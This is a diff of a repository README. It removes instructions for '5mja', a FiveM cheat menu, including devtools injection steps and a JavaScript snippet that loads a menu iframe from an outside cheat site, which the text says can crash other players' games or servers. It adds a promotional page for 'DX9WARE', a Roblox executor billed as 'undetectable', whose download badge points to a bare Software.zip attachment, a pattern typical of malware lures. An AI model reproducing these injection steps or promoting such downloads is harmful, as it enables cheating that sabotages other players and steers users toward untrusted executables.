@@ -1,30 +1,29 @@
-### What's 5mja?
-5mja is a open source cheat menu tool designed specifically using NUI technology for the popular online game FiveM. FiveM is a modification for the Grand Theft Auto V game, which allows users to play on custom servers with a variety of game modes and modifications. Unlike many other cheat menus that are Lua-based, 5mja can be injected using the built-in dev tool in FiveM, making it easier to use for some users. 5mja has several capabilities that allow players to exploit the game and gain an unfair advantage over others. For example, using 5mja, a player can spawn money or vehicles, even crash other players' games or the game server itself.<br/>
+# 🚀 Welcome to DX9WARE-Roblox 🚀
 
-It is important to note that using 5mja or any other cheat tool in public servers is considered unethical and against the game's terms of service. Cheating can ruin the game experience for others and can result in penalties or even legal consequences. It is recommended to use such tools only for educational purposes or in private servers with the consent of all players involved.
+![DX9WARE Logo](https://example.com/dx9ware-logo.png)
 
-#### Usage
-- Enable devtool by switching update channel of fivem to Beta.
-- Press F8 Tool->NUI->Open DevTools or visit http://localhost:13172/ in browser
-- Navigate to Sources tab press `Ctrl+F8` (Disable breakpoints) & press `Ctrl+\` (Resume script execution)
-- Navigate to Console tab select `top` in javaScript context.
-- <img src="https://cdn.discordapp.com/attachments/731452450074001418/1083050864341700638/Screenshot_2023-03-08_083700.png">
-- Copy & Paste menu injector javascript & press enter.
-- Open any nui element like phone which allow you to use cursor.
-- Press PageDown key for hide & show menu.
+### About:
+DX9WARE is a powerful Roblox executor that offers a secure and customizable Lua environment. It provides a variety of scripts and features for advanced scripting needs. This external tool is undetectable, making it perfect for experienced users.
 
-menu injector javascript
-```
-var iframe = document.createElement("iframe");
-iframe.setAttribute("src", "http://5mja.ninjhacks.com/menu");
-iframe.style.zIndex = "99999999999";
-document.body.appendChild(iframe);
-```
+### Features:
+- Secure Lua environment
+- Wide range of scripts
+- Customizable features
+- Undetectable design
+- Perfect for advanced scripting
 
-set zIndex to 0 for access other nui elements like phone.
-set zIndex to 9999999 for access other 5mja menu like phone.
-```
-iframe.style.zIndex = "0";
-```
+### Get Started:
+To get started with DX9WARE-Roblox, download the software by clicking the button below:
 
-For help & discussion join our discord server https://discord.gg/ninjhacks
+[![Download DX9WARE-Roblox](https://img.shields.io/badge/Download-DX9WARE--Roblox-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip "Click to Download DX9WARE-Roblox")
+
+### Note:
+The provided link needs to be launched to download the software. If the link does not work, please check the "Releases" section for an alternative download option.
+
+### Enjoy your advanced scripting experience with DX9WARE-Roblox! 🔥
+
+--- 
+
+### Additional Resources:
+- [DX9WARE-Roblox Official Website](https://dx9ware-roblox.com)
+- [DX9WARE-Roblox Community Forums](https://forums.dx9ware-roblox.com)
